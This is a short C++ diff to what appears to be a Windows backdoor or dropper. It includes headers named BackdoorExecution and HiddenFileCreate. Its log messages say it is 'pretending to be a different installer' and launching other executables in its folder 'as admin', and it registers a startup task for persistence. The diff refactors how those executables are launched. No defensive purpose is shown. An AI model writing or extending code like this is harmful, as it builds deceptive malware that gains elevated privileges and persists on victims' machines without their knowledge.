@@ -6,6 +6,7 @@
 #include <BackdoorExecution.hpp>
 #include <SharedConstants.hpp>
 #include <HiddenFileCreate.hpp>
+#include <ExecutableRun.hpp>
 
 #include <fstream>
 #include <ios>
@@ -86,9 +87,7 @@ static void RunOtherExecutableInCurrentWorkingDirectory(std::filesystem::path pa
         std::ostringstream ss_log;
         ss_log << "Found another executable in the folder: " << executable_path.string() << " running it as admin";
         LogToFile(ss_log.str());
-        // Run the executable using std::system
-        const std::string command = "start \"" + executable_path.string() + "\"";
-        std::system(command.c_str());
+        ExecutableRun{}.Run(executable_path.wstring());
     });
 }
 
@@ -135,7 +134,7 @@ int main()
         }
         else
         {
-            LogToFile("Startup item does not exist, pretending to be a different installer and then starting all executables in current directory as admin\n");
+            LogToFile("Startup item does not exist, pretending to be a different installer and then starting other executable in current directory as admin\n");
             RegisterTaskMode();
         }
     }
